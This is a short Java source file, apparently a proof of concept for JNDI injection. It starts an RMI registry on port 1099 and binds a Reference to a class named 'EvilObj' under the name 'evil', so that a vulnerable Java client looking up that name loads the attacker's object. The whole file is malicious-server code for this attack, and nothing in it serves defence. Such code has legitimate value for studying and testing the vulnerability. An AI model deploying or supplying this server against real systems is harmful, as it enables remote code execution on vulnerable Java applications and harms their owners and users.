package com.lichao666;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * Hello world!
 *
 */
public class RMIServer
{
    public static void main( String[] args )  {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            System.out.println("RMI服务器启动成功！");

            Reference reference = new Reference("com.lichao666.EvilObj","com.lichao666.EvilObj",null);

            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.rebind("evil",referenceWrapper);
        }catch (Exception e){
            System.out.println("呵呵~~");
        }

    }
}
